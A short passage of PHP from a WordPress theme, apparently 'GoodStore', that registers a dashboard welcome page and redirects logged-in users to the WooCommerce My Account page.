        update_option('jaw-gs-version', jaw_get_theme_version());
        add_dashboard_page($goodstore_welcome_title, $goodstore_welcome_title, 'manage_options', 'goodstore-welcome', array('jwPanel', 'jaw_welcome_screen'));
    }
}

function jaw_login_redirect($redirect_to, $request, $user) {
    //is there a user to check?

    $myaccount_page_id = get_option('woocommerce_myaccount_page_id');
    if ($myaccount_page_id) {
        $myaccount_page_url = get_permalink($myaccount_page_id);
        return $myaccount_page_url;
    } else {
        return $redirect_to;
    }
}
